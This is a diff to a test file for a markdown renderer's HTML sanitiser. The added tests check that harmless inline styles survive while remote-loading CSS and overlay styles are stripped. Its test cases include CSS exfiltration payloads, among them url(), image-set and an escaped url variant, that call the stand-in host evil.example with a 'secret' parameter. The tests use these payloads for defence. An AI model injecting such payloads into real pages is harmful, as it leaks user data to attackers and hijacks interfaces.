@@ -39,10 +39,52 @@ describe('renderMarkdown', () => {
     }
   })
 
-  it('keeps inline span style for now', () => {
+  it('keeps allowed inline styles', () => {
     const el = dom(renderMarkdown('a <span style="color: #c96; font-style: italic">warm</span> word'))
     const span = el.querySelector('span')
     expect(span?.getAttribute('style')).toBe('color: #c96; font-style: italic')
+  })
+
+  it('keeps a tinted recipe card', () => {
+    const style = 'background: rgba(200, 150, 100, 0.12); border: 1px solid #c96; border-radius: 14px; padding: 12px 16px; font-family: "Newsreader Variable", serif'
+    const el = dom(renderMarkdown(`<div style='${style}'>For the pot</div>`))
+    expect(el.querySelector('div')?.getAttribute('style')).toBe(style)
+  })
+
+  it.each([
+    'background-image: url(https://evil.example/?d=secret)',
+    'background: url(https://evil.example/?d=secret)',
+    'background: URL("https://evil.example/?d=secret")',
+    'background: u\\72 l(https://evil.example/?d=secret)',
+    'background: image-set("https://evil.example/a.png" 1x)',
+    'color: red; background: url("a;b")',
+    'border-image: url(https://evil.example/a.png)',
+    'list-style-image: url(https://evil.example/a.png)',
+    'cursor: url(https://evil.example/a.png), auto',
+    'font-family: url(https://evil.example/a.woff)',
+  ])('cannot load anything through style: %s', (style) => {
+    const html = renderMarkdown(`<span style='${style}'>x</span>`)
+    expect(html).not.toMatch(/evil\.example|url\(/i)
+    expect(dom(html).querySelector('span')?.textContent).toBe('x')
+  })
+
+  it('keeps the safe declarations next to a dropped one', () => {
+    const el = dom(renderMarkdown(`<span style='color: red; background: url(https://evil.example/a); font-weight: 600'>x</span>`))
+    expect(el.querySelector('span')?.getAttribute('style')).toBe('color: red; font-weight: 600')
+  })
+
+  it.each([
+    'position: fixed',
+    'inset: 0',
+    'z-index: 9999',
+    'display: none',
+    'display: flex',
+    'margin: -500px',
+    'font-size: 900px',
+    'color: red !important',
+  ])('drops what could cover or hijack the app: %s', (style) => {
+    const el = dom(renderMarkdown(`<div style='${style}'>x</div>`))
+    expect(el.querySelector('div')?.hasAttribute('style')).toBe(false)
   })
 
   it('strips in-page hash links so they cannot change the route', () => {
